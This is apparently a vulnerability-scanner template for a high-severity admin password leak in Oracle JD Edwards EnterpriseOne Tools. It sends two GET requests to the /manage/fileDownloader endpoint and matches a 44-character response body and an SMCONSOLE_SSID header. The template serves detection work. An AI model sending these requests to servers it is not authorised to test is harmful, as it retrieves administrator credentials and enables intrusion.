id: poc-jd-edwards-enterpriseone-tools-password-leaked
info:
  name: Oracle JDEdwards EnterpriseOne Tools Admin Password Leak
  author: ProjectDiscoveryAI
  severity: high
  tags: information-disclosure,jd-edwards
http:
  - raw:
      - |
        GET /manage/fileDownloader?sec= HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Managed Software Components"
  - raw:
      - |
        GET /manage/fileDownloader?sec=1 HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - "^[A-Z]{44}$"
      - type: word
        part: header
        words:
          - "SMCONSOLE_SSID="
